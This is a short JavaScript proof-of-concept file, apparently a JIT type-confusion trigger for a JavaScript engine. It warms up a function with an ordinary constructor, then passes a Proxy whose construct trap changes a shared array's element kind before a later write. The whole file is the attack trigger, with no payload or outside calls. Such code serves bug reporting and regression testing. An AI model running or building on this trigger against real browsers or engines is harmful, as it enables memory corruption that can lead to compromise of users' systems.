let shared_array;

function poc(Ctor) {
    let a = [1];
    shared_array = a;
    if (a[0] === 1) {
        Reflect.construct(Ctor, []);
        a[1] = 2;
    }
}

const GoodCtor = function() {};
const BadCtor = new Proxy(GoodCtor, {
    construct: () => {
        shared_array[0] = 1.1;
        return {};
    }
});

for (let i = 0; i < 25000; i++) {
    poc(GoodCtor);
}

poc(BadCtor);
